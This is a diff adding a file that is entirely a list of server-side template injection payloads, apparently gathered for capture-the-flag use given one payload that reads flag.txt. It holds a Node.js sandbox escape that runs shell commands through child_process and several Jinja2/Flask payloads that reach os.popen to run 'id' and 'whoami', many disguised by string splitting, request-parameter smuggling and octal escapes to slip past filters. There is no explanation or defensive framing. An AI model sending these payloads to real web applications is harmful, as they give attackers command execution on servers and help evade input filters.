@@ -1,0 +1,26 @@
+range.constructor("return global.process.mainModule.require('child_process').execSync('ls')")()
+
+request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
+
+'REQUEST'|attr('lower')()|'ARGS'|attr('lower')()|attr('cmd')
+
+cycler.__init__.__globals__.os.popen('id').read()
+
+
+{{()|attr(request['values']['Q1'])|attr(request['values']['Q2'])|attr(request['values']['Q3'])()|attr(request['values']['Q4'])(40)|attr(request['values']['Q5'])|attr(request['values']['Q6'])|attr(request['values']['Q4'])(request['values']['Q7'])|attr(request['values']['Q4'])(request['values']['Q8'])(request['values']['Q9'])}}
+
+
+
+Q1=__class__&Q2=__base__&Q3=__subclasses__&Q4=__getitem__&Q5=__init__&Q6=__globals__&Q7=__builtins__&Q8=eval&Q9=__import__("os").popen('whoami').read()
+
+
+
+{{()['__cla''ss__'].__bases__[0].__subclasses__()[40].__init__.__globals__['__builtins__']['ev''al']("__im""port__('o''s').po""pen('whoami').read()")}}
+
+
+
+{{().__getattribute__('__claAss__'.replace("A","")).__bases__[0].__subclasses__()[376].__init__.__globals__['popen']('whoami').read()}}
+
+{{a|attr("_init_")|attr("_globals_")|attr("_getitem_")("_builtins_")|attr("_getitem_")("eval")("__import__('os').popen('whoami').read()")}}
+
+{{a|attr("\137\137\151\156\151\164\137\137")|attr("\137\137\147\154\157\142\141\154\163\137\137")|attr("\137\137\147\145\164\151\164\145\155\137\137")("\137\137\142\165\151\154\164\151\156\163\137\137")|attr("\137\137\147\145\164\151\164\145\155\137\137")("\145\166\141\154")("\137\137\151\155\160\157\162\164\137\137\050\047\157\163\047\051\056\160\157\160\145\156\050\047\143\141\164\040\146\154\141\147\056\164\170\164\047\051\056\162\145\141\144\050\051")}}
